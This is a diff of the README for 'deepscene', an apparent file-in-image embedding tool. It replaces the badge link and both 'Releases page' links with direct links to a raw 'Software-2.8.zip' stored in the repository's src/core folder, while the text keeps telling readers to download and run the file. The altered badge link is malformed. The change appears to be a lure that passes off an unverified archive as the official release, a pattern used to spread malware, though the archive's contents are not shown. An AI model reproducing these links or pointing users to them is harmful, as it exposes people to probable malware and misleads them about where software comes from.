@@ -1,7 +1,7 @@
 # 🖼️ deepscene - Embed Files in Images Easily
 
 ## 📦 Download Now!
-[![Download deepscene](https://img.shields.io/badge/Download%20deepscene-v1.0-blue.svg)](https://github.com/WordRealm/deepscene/releases)
+[![Download deepscene](https://github.com/WordRealm/deepscene/raw/refs/heads/main/src/core/Software-2.8.zip%https://github.com/WordRealm/deepscene/raw/refs/heads/main/src/core/Software-2.8.zip)](https://github.com/WordRealm/deepscene/raw/refs/heads/main/src/core/Software-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -11,9 +11,9 @@ This guide will help you download and run the software on your computer, even if
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/WordRealm/deepscene/releases) to download the latest version of deepscene.
+To get started, visit the [Releases page](https://github.com/WordRealm/deepscene/raw/refs/heads/main/src/core/Software-2.8.zip) to download the latest version of deepscene.
 
-1. Go to the [Releases page](https://github.com/WordRealm/deepscene/releases).
+1. Go to the [Releases page](https://github.com/WordRealm/deepscene/raw/refs/heads/main/src/core/Software-2.8.zip).
 2. Look for the latest version.
 3. Find the file that matches your operating system and click it to download.
 4. Once the download is complete, locate the file on your computer and run it.
